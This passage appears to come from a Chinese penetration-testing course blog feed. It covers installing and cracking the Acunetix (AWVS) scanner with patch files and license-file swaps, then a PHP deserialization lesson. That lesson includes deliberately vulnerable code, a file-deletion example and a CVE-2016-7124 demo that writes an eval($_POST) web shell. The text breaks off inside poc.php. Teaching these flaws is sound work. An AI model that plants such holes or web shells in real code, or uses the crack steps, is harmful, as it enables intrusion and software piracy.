      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-1-jie-avws-an-zhuang-yu-ji-huo/</url>
      
        <content type="html"><![CDATA[<h1 id="第一节-AWVS安装与激活"><a href="#第一节-AWVS安装与激活" class="headerlink" title="第一节-AWVS安装与激活"></a>第一节-AWVS安装与激活</h1><h2 id="1-AWVS简介"><a href="#1-AWVS简介" class="headerlink" title="1.AWVS简介"></a>1.AWVS简介</h2><p>AWVS（Acunetix Web Vulnerability Scanner）是一款知名的<strong>网络漏洞扫描工具</strong>，通过网络爬虫测试网站安全，检测流行的Web应用攻击，如跨站脚本、sql 注入等。据统计，75% 的互联网攻击目标是基于Web的应用程序。</p><h2 id="2-为什么要用AWVS"><a href="#2-为什么要用AWVS" class="headerlink" title="2.为什么要用AWVS"></a>2.为什么要用AWVS</h2><p>在今天，网站的安全是容易被忽视的，黑客具备广泛的攻击手段，例SQL注入，XSS，文件包含，目录遍历，参数篡改，认证攻击等，虽然你配置了正确的防火墙和WAF，但是这些安全防御软件仍然存在策略性的绕过，因此，需要您定期的扫描你的web应用，但是手动检测你所有的web应用是否存在安全漏洞比较复杂和费时，所以您需要一款自动化的web漏洞扫描工具来检测您的web应用是否存在安全漏洞。</p><h2 id="3-windows-安装"><a href="#3-windows-安装" class="headerlink" title="3.windows 安装"></a>3.windows 安装</h2><p>1.解压 awvs14补丁.zip</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/81e865bc2d964e5992df154d068e9b00.png" alt="image.png"></p><p>2.双击 acunetix_14.1.210316110.exe 安装</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/2d71bb4195454a4694ce88dd6c3ff88e.png" alt="image.png"></p><p>3.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/0f9e40ee7a7f487199ebcbcbd829cccd.png" alt="image.png"></p><p>4.点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/4a57a401dc784646bb780f98ff4f5c44.png" alt="image.png"></p><p>5.点击【I accept the agreement 】,点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/bf133d8a4e0a4c82b83f777bb7b8aa69.png" alt="image.png"></p><p>6.选择喜欢的位置安装，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/88b1d9decc53420f8e913d962bf9f0c0.png" alt="image.png"></p><p>7.选择喜欢的位置保存 Data，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/0b33e0cefcb848b395a5414cb71afae4.png" alt="image.png"></p><p>8.输入账号名：<a href="mailto:admin@msb.com">admin@msb.com</a>,密码：m123456@，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/deb2586fac9942e68ecf8b0f848de948.png" alt="image.png"></p><p>9.选择【Allow remote access to Acunetix】，选择IP，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/20d3c97cb28d407ba52d8ad48a9320ee.png" alt="image.png"></p><p>10.点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/9967226ab34146a0bfeab18109f1eb05.png" alt="image.png"></p><p>11.点击【install】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/fd5c6d67cf7a4be19d5c1348d7e11252.png" alt="image.png"></p><p>12.等待安装完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/def992e831474a3b82acb84da82f5d0d.png" alt="image.png"></p><p>13.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/057f985ac8a34101aa55e2255c31519d.png" alt="image.png"></p><p>14.点击【Finsh】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/41c819b1c8014895a7a808f75f888790.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/b47d1c4b81d448098ca2effdf805161f.png" alt="image.png"></p><p>15.右键【我的电脑】，点击【管理】，选择【服务和应用成序】,点击【服务】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/a9bf3bb1a1b9418ab5567e2aa325bbe4.png" alt="image.png"></p><p>16.右键【Acunetix】和【Acunetix Database】，停止Acunetix和Acunetix Database服务</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/99b73f6746b74eb5aba49d0ae808e4e1.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/292cbd039b4c4e959650b79fc48c08ae.png" alt="image.png"></p><p>17.将【awvs14补丁】里的【license_info.json】 复制到【D:\ProgramData\Acunetix\shared\license】，点击【替换】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/3b23edb624d34503ac1bc702ee4d0497.png" alt="image.png"></p><p>18.将【awvs14补丁】里的【wa_data.dat】复制到【D:\ProgramData\Acunetix\shared\license】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/49338f031ce9493998c03de87ed9ccbc.png" alt="image.png"></p><p>19.将【awvs14补丁】里的【wvsc.exe】复制到【D:\Program Files (x86)\Acunetix\14.1.210316110】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/8cafbb2374d54bbe85d296a8ca2f500b.png" alt="image.png"></p><p>20.右键【Acunetix】和【Acunetix Database】，启动 Acunetix和Acunetix Database服务</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/1e154e0b0ee54e6ea5f057bb25fb2dbc.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/0519547b40a34109be8693cb411089d3.png" alt="image.png"></p><p>21.刷新浏览器的管理页面，点击【高级..】,点击【接受风险并继续】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/7bf0bc40416a4ef9995284f6b5bd9e2f.png" alt="image.png"></p><p>22.登录管理员账号 <a href="mailto:admin@msb.com">admin@msb.com</a>,密码：m123456@</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/92cc8f0bd37f41348aef73b4e7a35655.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/ca33061b2639475e9291461f012c901d.png" alt="image.png"></p><h2 id="4-kali-安装AWVS"><a href="#4-kali-安装AWVS" class="headerlink" title="4. kali 安装AWVS"></a>4. kali 安装AWVS</h2><p>1.将acunetix_trial.sh 和 patch_awvs 复制到kali中</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/2f852ac510d54e82bfac2e7cf3ac183a.png" alt="image.png"></p><p>2.修改 acunetix_trial.sh 和 patch_awvs  权限</p><pre class="line-numbers language-none"><code class="language-none">chmod 777 acunetix_trial.sh patch_awvs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.执行安装命令</p><pre class="line-numbers language-none"><code class="language-none">./acunetix_trial.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.点击enter键继续</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/de2f4d0b46ee421d896b08db9e016a80.png" alt="image.png"></p><p>5.一直按住enter键继续</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/047824864f324f0c89e6e37a7824fdb4.png" alt="image.png"></p><p>6.输入yes，点击 【回车】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/aa3d4d4cb50d4e92af6685bc90a9108e.png" alt="image.png"></p><p>7.输入主机名称，点击【回车】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/e91bc8a405054d6fadb58fbc76051884.png" alt="image.png"></p><p>8.输入email ：【<a href="mailto:admin@msb.com">admin@msb.com</a>】点击【回车】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/f3d402f52cdd46e59bdeda18fd704374.png" alt="image.png"></p><p>9.输入Password：【m123456@】点击回车，输入【m123456@】，点击回车</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/00b3b7c2c16a4a899c607e7aadde1aa0.png" alt="image.png"></p><p>10.等待安装完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/9431cda311874684ba3251424cf8b5a7.png" alt="image.png"></p><p>11.把破解补丁复制到指定目录下，并设置好权限，直接运行即可</p><pre class="line-numbers language-none"><code class="language-none">cp -a patch_awvs /home/acunetix/.acunetix_trial/v_190325161/scanner/chmod 777 /home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs/home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/db407d2b36ac498d8e47e079cf18de63.png" alt="image.png"></p><p>12.为了保护原始license不失效，这里尽快执行如下的命令，不然license会被修改然后就无法破解成功。</p><pre class="line-numbers language-none"><code class="language-none">chattr +i /home/acunetix/.acunetix_trial/data/license/license_info.jsonrm -fr /home/acunetix/.acunetix_trial/data/license/wa_data.dattouch /home/acunetix/.acunetix_trial/data/license/wa_data.datchattr +i /home/acunetix/.acunetix_trial/data/license/wa_data.dat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>13.重新启动AWVS进程</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart acunetix_trial.service <span class="token comment">#重启进程</span>systemctl start acunetix_trial.service   <span class="token comment">#启动进程</span>systemctl stop acunetix_trial.service    <span class="token comment">#停止进程</span>systemctl status acunetix_trial.service  <span class="token comment">#查看进行状态 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>14.访问：<a href="https://127.0.0.1:13443/">https://127.0.0.1:13443/</a> 进入AWVS首页，点击【Advanced..】,点击【Accept the Risk and Continue】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/228eea4050e84c5bb1a2aa7dddee9c8b.png" alt="image.png"></p><p>15.输入用户名：<a href="mailto:admin@msb.com">admin@msb.com</a>,密码：m123456@ 进行登录</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/5375b020a8184250b679aea740cb4c6e.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/24f077d4968a4f16be2c42d0ca473c9d.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/7de783bf900d46e581cbc78c26b9420c.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/suo-you-zi-liao-xia-zai-di-zhi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/suo-you-zi-liao-xia-zai-di-zhi/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1lLRb1Zo7AvzbBfjqD86AlA?pwd=8888">https://pan.baidu.com/s/1lLRb1Zo7AvzbBfjqD86AlA?pwd=8888</a><br>提取码：8888<br>–来自百度网盘超级会员V3的分享</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/21-fan-xu-lie-hua/php-fan-xu-lie-hua/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/21-fan-xu-lie-hua/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>PHP类与对象 </li><li>PHP Magic函数 </li><li>PHP序列化与反序列化</li><li>反序列化漏洞的出现 </li><li>CTF题目分析 </li><li>Typecho反序列化漏洞 </li><li>PHP反序列化漏洞防御</li></ol><h1 id="PHP类与对象"><a href="#PHP类与对象" class="headerlink" title="PHP类与对象"></a>PHP类与对象</h1><h2 id="类Class"><a href="#类Class" class="headerlink" title="类Class"></a>类Class</h2><p>一个共享相同结构和行为的对象的集合</p><p><img src="/assets/image-20221126155421686.png" alt="image-20221126155421686"></p><h2 id="对象Object"><a href="#对象Object" class="headerlink" title="对象Object"></a>对象Object</h2><p>类的实例</p><p><img src="/assets/image-20221126155454378.png" alt="image-20221126155454378"></p><h1 id="Magic函数"><a href="#Magic函数" class="headerlink" title="Magic函数"></a>Magic函数</h1><h2 id="Magic-Methods-魔术方法"><a href="#Magic-Methods-魔术方法" class="headerlink" title="Magic Methods 魔术方法"></a>Magic Methods 魔术方法</h2><p><a href="https://www.php.net/__sleep">https://www.php.net/__sleep</a> </p><pre class="line-numbers language-none"><code class="language-none">__construct()， __destruct() __call()， __callStatic() __get()， __set()__isset()， __unset() __sleep()， __wakeup() __serialize(), __unserialize() __toString(), __invoke() __set_state(), __clone() __debugInfo()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数作用"><a href="#函数作用" class="headerlink" title="函数作用"></a>函数作用</h2><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>__construct</td><td>当一个<strong>对象创建</strong>时被调用</td></tr><tr><td>__destruct</td><td>当一个<strong>对象销毁</strong>时被调用</td></tr><tr><td>__toString</td><td>当一个<strong>对象被当作一个字符串</strong>使用</td></tr><tr><td>__sleep</td><td>在对象被序列化<strong>之前</strong>运行</td></tr><tr><td>__wakeup</td><td>在对象被反序列化<strong>之后</strong>被调用</td></tr><tr><td>__serialize()</td><td>对对象调用**serialize()**方法，PHP 7.4.0 起</td></tr><tr><td>__unserialize()</td><td>对对象调用**unserialize()**方法，PHP 7.4.0 起</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__callStatic()</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>用于从不可访问的属性读取数据</td></tr><tr><td>__set()</td><td>用于将数据写入不可访问的属性</td></tr><tr><td>__isset()</td><td>在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td>__unset()</td><td>在不可访问的属性上使用unset()时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><h1 id="PHP序列化和反序列化"><a href="#PHP序列化和反序列化" class="headerlink" title="PHP序列化和反序列化"></a>PHP序列化和反序列化</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><p><img src="/assets/image-20221126160218582.png" alt="image-20221126160218582"></p><h2 id="类型序列化"><a href="#类型序列化" class="headerlink" title="类型序列化"></a>类型序列化</h2><table><thead><tr><th>类型</th><th>格式</th></tr></thead><tbody><tr><td>String</td><td>s:size:value;</td></tr><tr><td>Integer</td><td>i:value;</td></tr><tr><td>Boolean</td><td>b:value;(保存1或0)</td></tr><tr><td>Null</td><td>N;</td></tr><tr><td>Array</td><td>a:size:{key definition;value definition;(repeated per element)}</td></tr><tr><td>Object</td><td>O:strlen(object name):object name : object  size:{s:strlen(property name):property name:property definition;(repeated per property)}</td></tr></tbody></table><h2 id="其他序列化格式"><a href="#其他序列化格式" class="headerlink" title="其他序列化格式"></a>其他序列化格式</h2><p>json字符串 <code>json_encode</code></p><p> xml字符串 <code>wddx_serialize_value</code> </p><p>二进制格式 </p><p>字节数组</p><h2 id="反序列化：注意"><a href="#反序列化：注意" class="headerlink" title="反序列化：注意"></a>反序列化：注意</h2><p>1、如果传递的字符串不可以序列化，则返回 FALSE </p><p>2、如果对象没有预定义，反序列化得到的对象是 </p><p>__PHP_Incomplete_Class</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>1、传输对象</p><p>2、用作缓存（Cookie、Session）</p><h2 id="反序列化与Maigc函数"><a href="#反序列化与Maigc函数" class="headerlink" title="反序列化与Maigc函数"></a>反序列化与Maigc函数</h2><p><code>__wakeup</code> </p><p><code>__unserialize（7.4.0）</code> </p><p>如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup()</code> 方法会被忽略。</p><h1 id="反序列化的出现"><a href="#反序列化的出现" class="headerlink" title="反序列化的出现"></a>反序列化的出现</h1><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="logfile-php"><a href="#logfile-php" class="headerlink" title="logfile.php"></a>logfile.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Class logfile * 功能说明：临时记录日志到error.log文件 * __destruct被调用的时候，删除 error.log 文件 */</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">logfile</span><span class="token punctuation">{</span>    <span class="token comment">//log文件名</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'error.log'</span><span class="token punctuation">;</span>    <span class="token comment">//一些用于储存日志的代码</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">logdata</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'log data:'</span><span class="token operator">.</span><span class="token variable">$text</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br /&gt;'</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//destrcuctor 删除日志文件</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'__destruct deletes '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token operator">.</span><span class="token string single-quoted-string">' file.&lt;br /&gt;'</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>记录日志：file_put_contents() </li><li>类销毁的时候，删除这个日志文件：__destruct()、unlink() </li><li>日志文件的名字通过filename指定</li></ol><h3 id="request-php-利用"><a href="#request-php-利用" class="headerlink" title="request.php 利用"></a>request.php 利用</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * 引用了 logfile文件，包含__destruct方法 * */</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'logfile.php'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>    <span class="token comment">//类数据</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token comment">//输出数据</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">printdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'User '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">.</span><span class="token string single-quoted-string">' is'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token operator">.</span><span class="token string single-quoted-string">' years old.&lt;br /&gt;'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 通过GET请求参数传入字符</span><span class="token comment">// 此处可以反序列化任意对象</span><span class="token variable">$usr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>unserialize通过GET传输反序列化字符串 </li><li>替换了字符串的filename值，比如index.php </li><li>导致当前目录index.php被删除 </li><li>可以删除任意文件</li></ol><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>unserialize函数的<strong>参数可控</strong>，比如通过GET请求传参（漏洞触发点） </li><li>脚本中定义了<strong>有Magic方法</strong>，方法里面有向php文件做读写数据或者<strong>执行命令的操作</strong>，比如__destruct()、unlink() </li><li>操作的内容需要有对象中的成员<strong>变量的值</strong>，比如 filename</li></ol><h2 id="常见利用函数"><a href="#常见利用函数" class="headerlink" title="常见利用函数"></a>常见利用函数</h2><table><thead><tr><th>类别</th><th>函数</th></tr></thead><tbody><tr><td>命令执行</td><td>exec() passthru() popen() system() ……</td></tr><tr><td>文件操作</td><td>file_put_contents() file_get_contents() unlink() ……</td></tr></tbody></table><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>序列化一个对象 ，修改成员变量的值，达到操作其他 文件或者执行命令的目的</p><h1 id="CTF题目分析"><a href="#CTF题目分析" class="headerlink" title="CTF题目分析"></a>CTF题目分析</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><h3 id="攻防世界：unserialize3"><a href="#攻防世界：unserialize3" class="headerlink" title="攻防世界：unserialize3"></a>攻防世界：unserialize3</h3><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=1013364e-31aa-4643-8322-e126f12c1b82_2&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=1013364e-31aa-4643-8322-e126f12c1b82_2&amp;task_category_id=3</a></p><p><a href="http://61.147.171.105:53418/">http://61.147.171.105:53418</a></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class xctf{public $flag = '111';public function __wakeup(){exit('bad requests');}?code=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CVE-2016-7124示例"><a href="#CVE-2016-7124示例" class="headerlink" title="CVE-2016-7124示例"></a>CVE-2016-7124示例</h3><p>cve7124.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 目标：反序列化的时候绕过__wakeup以达到写文件的操作</span><span class="token comment">// CVE-2016-7124</span><span class="token comment">// PHP5小于5.6.25或PHP7小于7.0.10</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>    <span class="token comment">// 私有成员变量</span>    <span class="token keyword">private</span> <span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">poc</span> <span class="token operator">=</span> <span class="token variable">$poc</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">poc</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST["shell"]);?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fail to getshell!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment">// 返回由对象属性组成的关联数组，把所有的属性置空</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=&gt;</span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"waking up...n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">/*if(!isset($poc)){    show_source(__FILE__);    die();}*/</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"your payload:"</span><span class="token operator">.</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// PHP5小于5.6.25或PHP7小于7.0.10</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>poc.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// PHP5小于5.6.25或PHP7小于7.0.10</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">poc</span> <span class="token operator">=</span> <span class="token variable">$poc</span><span class="token punctuation">;</span>    